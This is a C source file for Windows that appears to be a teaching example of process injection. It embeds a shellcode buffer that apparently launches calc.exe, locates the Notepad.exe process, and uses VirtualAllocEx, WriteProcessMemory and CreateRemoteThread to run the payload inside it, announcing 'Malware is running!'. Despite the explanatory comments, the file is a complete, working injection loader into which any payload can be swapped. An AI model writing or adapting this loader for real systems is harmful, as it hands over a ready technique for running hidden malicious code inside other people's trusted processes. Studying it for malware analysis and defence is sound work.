#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>  //Gives us access to Windows system calls
#include <tlhelp32.h> //Gives us access to the system call for getting info about processes

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int bufSize = 276;

int findProcess(const char* processName) {
	int procID = 0;
	wchar_t wProcName[255]; //wide chars take up more memory and have more representational power
	size_t converted; //This will store the number of characters converted to wide characters
					  //Note - We're not going use this, but a function call needs it

	mbstowcs_s(&converted, wProcName, (size_t)255, processName, strlen(processName));
	printf("Looking for: %ws\n", wProcName);
	
	//Get a handle to the list of running processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	//Used to store one of the processes out of the snapshot
	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(PROCESSENTRY32);
	
	//Fetching the first element of the linked list
	Process32First(snapshot, &proc);

	while (Process32Next(snapshot, &proc)) {
		printf("Looking at: %ws\n", proc.szExeFile);
		if (wcscmp(proc.szExeFile, wProcName) == 0) {
			printf("Process found: %ws - %d\n", proc.szExeFile, proc.th32ProcessID);
			CloseHandle(snapshot);
			return proc.th32ProcessID;
		}
	}
	printf("Process %ws not found\n", wProcName);
	return 0;
}

void injectPayload(HANDLE targetProcess, unsigned char* payload, unsigned int payloadLength) {
	
	LPVOID addr = NULL;	//Use addr to track where the memory is allocated
	SIZE_T bytesWritten;
	HANDLE malThread = NULL;

	//Step #1 - Asking the target process to allocate more memory
	addr = VirtualAllocEx(targetProcess, NULL, payloadLength, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(targetProcess, addr, (PVOID)payload, (SIZE_T)payloadLength, &bytesWritten);
	malThread = CreateRemoteThread(targetProcess, NULL, 0, addr, NULL, NULL, NULL);
	if (malThread != NULL) {
		printf("Malware is running!\n");
	}
}

int main(void) {
	int procID = 0; //Will hold the process ID of the process we want to inject into
	HANDLE targetProcess;

	//Step 1: Find the process you want to inject your code into

	procID = findProcess("Notepad.exe");
	if (procID == 0) return 0;

	//Step 2: Open a handle to the process
	targetProcess = OpenProcess(
		PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |	//VM = virtual memory
		PROCESS_VM_READ |
		PROCESS_VM_WRITE,
		FALSE,
		procID
	);


	//Step 3: Inject the code into the process
	injectPayload(targetProcess, buf, bufSize);

}